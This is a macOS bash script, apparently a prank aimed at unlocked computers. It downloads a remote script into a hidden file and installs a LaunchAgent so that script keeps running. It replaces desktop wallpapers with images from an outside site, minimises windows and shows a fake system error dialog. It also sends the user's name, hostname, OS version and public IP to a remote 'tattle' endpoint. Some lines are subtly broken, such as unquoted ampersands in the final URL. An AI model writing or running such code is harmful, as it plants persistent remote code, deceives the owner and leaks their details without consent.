#!/usr/bin/env bash
#
if [[ -f $HOME/.unlocked ]]; then
  curl -so $HOME/.file.sh https://runthis.sh/desktop.sh
fi
# Get macOS version
macos_version=$(sw_vers -productVersion)
# Based on major.minor version, determine default wallpaper
case "${macos_version%.*}" in
    10.14) 
        default_wallpaper="/Library/Desktop Pictures/Mojave.heic"
        ;;
    10.15)
        default_wallpaper="/Library/Desktop Pictures/Catalina.heic"
        ;;
    11.*)
        default_wallpaper="/System/Library/Desktop Pictures/Big Sur.heic"
        ;;
    12.*)
        default_wallpaper="/System/Library/Desktop Pictures/Monterey.heic"
        ;;
    *)
        echo "Unknown macOS version. Can't determine default wallpaper."
        # Put random image in /tmp/img0.jpg
        curl -sLo /tmp/img0.jpg "https://anthony.bible/image?redirect=true"
        default_wallpaper="/tmp/img0.jpg"
        ;;
esac

# Remove /tmp/img.jpg if it exists
if [[ -f $HOME/Desktop/img.jpg ]]; then
    rm $HOME/Desktop/img.jpg
fi
curl -sLo $HOME/Desktop/img.jpg "https://anthony.bible/image?redirect=true" 

if [[ ! -f $HOME/Desktop/img.jpg ]]; then
    echo "Hmm that didn't download the file properly"
    exit 1
fi
osascript -e "tell application \"System Events\" to tell every desktop to set picture to \"$default_wallpaper\""
sleep 1
# Determine the number of desktops (monitors)
desktop_count=$(osascript -e 'tell application "System Events" to count of desktops')

# Loop through each desktop (monitor)
for i in $(seq 1 $desktop_count);
do
    # Set the image path based on monitor number
    image_path="$HOME/Desktop/img${i}.jpg"

    # Remove the image if it exists
    if [[ -f $image_path ]]; then
        rm $image_path
    fi

    # Download a new image to the image path. Assume the server provides a different image based on the monitor number or some other criteria
    curl -sLo $image_path "https://anthony.bible/image?redirect=true"

    if [[ ! -f $image_path ]]; then
        echo "Failed to download the image for monitor $i"
    fi
    sleep 1
    # Set the downloaded image as the wallpaper for that monitor
    osascript -e "tell application \"System Events\" to set picture of desktop $i to \"$image_path\""
done
# Reset desktop picture

sleep 1
osascript -e 'tell application "System Events" to set miniaturized of every window to true'



# this isn't workiing so commented it out
#osascript -e 'do shell script "/System/Library/CoreServices/Menu\\ Extras/User.menu/Contents/Resources/CGSession -suspend"'

# If the $HOME/.unlocked file exists create a launchd timed command
if [[ -f $HOME/.unlocked ]]; then
    # Create a launchd command to run this script again in 5 minutes
    cat > $HOME/Library/LaunchAgents/com.sre.unlocked.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.sres.unlocked</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>$HOME/.file.sh</string>
    </array>
    <key>StartInterval</key>
    <integer>10000</integer>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF
    launchctl load $HOME/Library/LaunchAgents/com.sre.unlocked.plist
fi

osascript -e 'tell app "System Events" to display dialog "An unknown error occurred. Have you tried turning it off and on again?" with title "System Error"'

touch $HOME/.unlocked

curl runthis.sh/tattle?user=$(whoami)&host=$(hostname)&os=$(sw_vers -productVersion)&ip=$(curl -s ifconfig.me)&date=$(date)